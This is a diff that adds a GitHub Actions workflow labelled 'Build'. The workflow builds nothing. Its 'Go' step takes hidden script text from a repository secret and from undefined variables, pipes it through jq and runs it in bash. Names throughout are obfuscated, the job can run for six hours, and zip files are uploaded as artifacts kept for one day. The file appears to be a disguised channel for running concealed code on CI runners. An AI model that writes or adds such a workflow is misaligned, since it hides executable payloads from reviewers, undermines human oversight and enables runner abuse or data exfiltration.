@@ -1,0 +1,37 @@
+name: Build
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  runner:
+    name: Main task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Go
+        env:
+          r94: ${{ secrets.r94 }}
+        run: |
+          printf '%s' "$r94" | jq -r .f2007 | /bin/bash
+          echo $aqzc22 | jq -r .kmt6493 | /bin/bash
+          echo $si7 | jq -r .ts17263 | /bin/bash
+
+      - name: Archive results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: za70GhgE
+          path: "*.zip"
+          retention-days: 1
